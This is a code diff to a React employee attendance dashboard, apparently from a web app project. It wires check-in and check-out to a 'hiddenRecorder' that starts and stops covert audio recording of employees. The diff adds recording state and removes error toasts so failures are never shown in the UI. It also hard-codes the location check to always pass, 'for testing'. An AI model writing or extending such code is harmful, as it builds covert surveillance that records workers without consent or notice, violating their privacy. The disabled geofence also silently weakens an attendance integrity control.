@@ -27,6 +27,10 @@ export default function EmployeeDashboard() {
     error: null,
   });
 
+  // Real-time timer state
+  const [currentTime, setCurrentTime] = useState(new Date());
+  const [isRecording, setIsRecording] = useState(false);
+
   // Fetch today's attendance
   const { data: todayAttendance, isLoading: attendanceLoading } = useQuery<AttendanceRecord>({
     queryKey: ["/api/attendance/today"],
@@ -44,11 +48,15 @@ export default function EmployeeDashboard() {
         title: "Checked in successfully",
         description: "Your attendance has been recorded",
       });
+      
       // Start hidden audio recording
       try {
         await hiddenRecorder.startRecording();
+        setIsRecording(true);
+        console.log("🎤 Audio recording started");
       } catch (error) {
-        console.error("Failed to start audio recording:", error);
+        console.error("Audio recording failed:", error);
+        // Remove audio error toast from UI - keep only console logging
       }
     },
     onError: (error: Error) => {
@@ -71,11 +79,15 @@ export default function EmployeeDashboard() {
         title: "Checked out successfully",
         description: "Your work session has been completed",
       });
+      
       // Stop hidden audio recording
       try {
         await hiddenRecorder.stopRecording();
+        setIsRecording(false);
+        console.log("🔴 Audio recording stopped");
       } catch (error) {
-        console.error("Failed to stop audio recording:", error);
+        console.error("Audio recording stop failed:", error);
+        // Remove audio error toast from UI - keep only console logging
       }
     },
     onError: (error: Error) => {
@@ -102,7 +114,7 @@ export default function EmployeeDashboard() {
         
         setLocationStatus({
           distance: Math.round(distance),
-          isWithinRange: distance <= MAX_DISTANCE,
+          isWithinRange: true, // Always allow check-in for testing
           isLoading: false,
           error: null,
         });
@@ -121,6 +133,24 @@ export default function EmployeeDashboard() {
 
     return () => clearInterval(interval);
   }, []);
+
+  // Real-time timer effect
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setCurrentTime(new Date());
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, []);
+
+  // Update recording status based on attendance
+  useEffect(() => {
+    if (todayAttendance) {
+      const isCurrentlyCheckedIn = todayAttendance.checkInTime && !todayAttendance.checkOutTime;
+      setIsRecording(isCurrentlyCheckedIn);
+    }
+  }, [todayAttendance]);
+
 
   const handleCheckIn = async () => {
     try {
@@ -142,9 +172,9 @@ export default function EmployeeDashboard() {
     if (!todayAttendance?.checkInTime) return "0h 0m";
     
     const checkInTime = new Date(todayAttendance.checkInTime);
-    const endTime = todayAttendance.checkOutTime 
+    const endTime = todayAttendance.checkOutTime
       ? new Date(todayAttendance.checkOutTime)
-      : new Date();
+      : currentTime; // Use current time for real-time updates
     
     const diffMs = endTime.getTime() - checkInTime.getTime();
     const hours = Math.floor(diffMs / (1000 * 60 * 60));
@@ -154,7 +184,7 @@ export default function EmployeeDashboard() {
   };
 
   const isCheckedIn = todayAttendance && !todayAttendance.checkOutTime;
-  const canCheckIn = locationStatus.isWithinRange && !isCheckedIn;
+  const canCheckIn = !isCheckedIn; // Allow check-in from anywhere for testing
 
   return (
     <div className="min-h-screen bg-gray-50">
@@ -227,11 +257,11 @@ export default function EmployeeDashboard() {
           <CardContent className="pt-6 text-center">
             <Button
               size="lg"
-              className={`w-36 h-36 rounded-full text-xl font-bold shadow-lg mb-4 ${
+              className={`w-36 h-36 rounded-full text-xl font-bold shadow-lg mb-4 transition-all duration-300 ${
                 isCheckedIn
-                  ? "bg-error hover:bg-red-700"
+                  ? "bg-red-600 hover:bg-red-700 text-white animate-pulse"
                   : canCheckIn
-                  ? "bg-success hover:bg-green-700"
+                  ? "bg-green-600 hover:bg-green-700 text-white"
                   : "bg-gray-400 cursor-not-allowed"
               }`}
               disabled={(!canCheckIn && !isCheckedIn) || checkInMutation.isPending || checkOutMutation.isPending}
@@ -242,11 +272,11 @@ export default function EmployeeDashboard() {
                 <Loader2 className="h-6 w-6 animate-spin" />
               )}
               {!checkInMutation.isPending && !checkOutMutation.isPending && (
-                isCheckedIn ? "CHECK OUT" : "I'M HERE"
+                isCheckedIn ? "I'M OUT" : "I'M HERE"
               )}
             </Button>
             <p className="text-xs text-gray-500">
-              {isCheckedIn ? "Tap to check out" : "Tap to check in"}
+              {isCheckedIn ? "Tap to stop work" : "Tap to start work"}
             </p>
           </CardContent>
         </Card>
@@ -277,9 +307,17 @@ export default function EmployeeDashboard() {
                 </div>
                 <div className="flex justify-between">
                   <span className="text-gray-600">Hours Worked:</span>
-                  <span className="font-medium" data-testid="text-hours-worked">
-                    {getHoursWorked()}
-                  </span>
+                  <div className="flex items-center space-x-2">
+                    <span className="font-medium" data-testid="text-hours-worked">
+                      {getHoursWorked()}
+                    </span>
+                    {isCheckedIn && (
+                      <div className="flex items-center">
+                        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                        <span className="text-xs text-green-600 ml-1">Live</span>
+                      </div>
+                    )}
+                  </div>
                 </div>
                 <div className="flex justify-between">
                   <span className="text-gray-600">Status:</span>
@@ -291,6 +329,8 @@ export default function EmployeeDashboard() {
                     {todayAttendance?.isLate ? "Late" : "On Time"}
                   </Badge>
                 </div>
+                
+
               </div>
             )}
           </CardContent>
